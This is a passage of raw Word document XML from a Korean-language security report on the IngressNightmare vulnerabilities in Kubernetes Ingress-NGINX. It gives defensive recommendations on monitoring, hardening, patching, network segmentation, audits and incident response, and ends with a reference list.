      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Ingress 리소스의 annotation 값에 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개행</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 문자, 세미콜론, NGINX directive 등 비정상 패턴이 포함되어 있는지 정기적으로 점검합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709877E3" w14:textId="53EC57D3" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Falco, Suricata, Snort 등 정책 기반 탐지 도구와 Kubernetes Audit Log를 연동해, 악성 Ingress 생성 시도, NGINX 설정 오류, Secrets 접근 이벤트 등을 실시간으로 모니터링해야 합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243C3627" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안 구성 및 운영 정책 강화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F64538" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller, Ingress Controller 등 핵심 컴포넌트의 네트워크 접근을 엄격히 제한하고, 불필요한 외부 노출을 차단합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66CA4105" w14:textId="5ED12FB6" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">NGINX 설정 파일은 주기적으로 검토 및 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>하드닝하고</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>, 위험한 directive 사용을 제한해야 합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="782D482F" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점 대응 훈련 및 사고 대응 계획 수립</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF8B98B" w14:textId="2E8D03AD" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="0006542A">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="109"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">취약점 악용 시나리오를 포함한 사고 대응 훈련을 실시하고, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인시던트</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 발생 시 신속한 탐지·격리·복구가 가능하도록 대응 체계를 점검해야 합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0C565B" w14:textId="77683FA2" w:rsidR="0006542A" w:rsidRPr="0006542A" w:rsidRDefault="0006542A" w:rsidP="0006542A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006542A">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">10.3 </w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>장기적</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>강화</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>방안</w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>제시</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C82A96D" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>자동화된 패치 및 취약점 관리 체계 구축</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAA8A66" w14:textId="4367705B" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CI/CD 파이프라인과 연계한 자동화된 패치 배포 및 이미지 취약점 스캐닝 체계를 도입해, 신규 취약점이 공개될 때마다 신속하게 대응할 수 있도록 합니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488C2FB0" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>네트워크 분리 및 세분화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="450E5B76" w14:textId="7E774A51" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>네트워크 정책(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>NetworkPolicy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>), 방화벽, VPC 등으로 클러스터 내 핵심 컴포넌트의 네트워크 경계를 분리하고, lateral movement를 최소화합니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D7A69E" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안 감사 및 규정 준수 강화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361FD2B1" w14:textId="4431F6E7" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정기적으로 클러스터 내 서비스 계정, RBAC, Secrets 접근 내역, Ingress 리소스 설정 등 보안 감사를 실시하고, 규정 준수 상태를 점검합니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE29B3A" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안 인식 제고 및 교육</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7969F27C" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개발자와 운영자를 대상으로 Kubernetes 및 Ingress-NGINX 보안 교육을 정기적으로 시행해, 최신 공격 트렌드와 보안 모범 사례를 공유합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708866F8" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">취약점 대응 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>플레이북</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 및 커뮤니케이션 체계 마련</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BE335E6" w14:textId="59F08FF5" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="110"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">취약점 공개 시 신속하게 대응할 수 있도록 대응 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>플레이북을</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 마련하고, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안팀</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>-개발팀-운영팀 간 원활한 커뮤니케이션 체계를 구축합니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458BD5C5" w14:textId="33EB3A59" w:rsidR="0006542A" w:rsidRPr="009E3DDA" w:rsidRDefault="0006542A" w:rsidP="0006542A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A0DA895" w14:textId="77777777" w:rsidR="00E27F85" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0909425F" w14:textId="1D94DE7A" w:rsidR="00E27F85" w:rsidRPr="00464E98" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00464E98">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">11. </w:t>
      </w:r>
      <w:r w:rsidR="009E3DDA" w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>참고문헌</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA3EFFC" w14:textId="77777777" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="111"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Datadog Security Labs, "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>IngressNightmare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerabilities overview and remediation", 2025-03-25.</w:t>
      </w:r>
    </w:p>
